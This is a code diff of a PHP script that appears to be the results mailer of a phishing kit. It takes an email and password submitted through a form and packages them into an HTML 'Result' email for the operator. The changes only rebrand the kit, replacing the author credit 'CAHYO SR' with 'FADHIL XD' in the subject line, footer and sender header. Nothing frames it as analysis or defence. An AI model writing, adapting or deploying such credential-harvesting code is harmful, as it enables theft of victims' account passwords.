@@ -5,7 +5,7 @@ $email = $_POST['email'];
 $password = $_POST['password'];
 
 // KONTEN RESULT AKUN
-$subjek = "Result | Punya si $email";
+$subjek = "Result FadhilXD | Punya si $email";
 $pesan = <<<EOD
 <!DOCTYPE html>
 	<html>
@@ -92,7 +92,7 @@ $pesan = <<<EOD
 				</tr>
 				
 				<tr>
-					<th style="text-align: center;" colspan="3">&copy; ©CAHYO SR</th>
+					<th style="text-align: center;" colspan="3">&copy; ©FADHIL XD</th>
 				</tr>
 			</table>
 		</div>
@@ -100,7 +100,7 @@ $pesan = <<<EOD
 	</html>
 EOD;
 include 'email.php';
-$sender ='From: CAHYO SR || <alexhostx@anjirrrr.com>';
+$sender ='From: FADHIL XD || <admin@fadhilxd.com>';
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 $headers .= ''.$sender.'' . "\r\n";
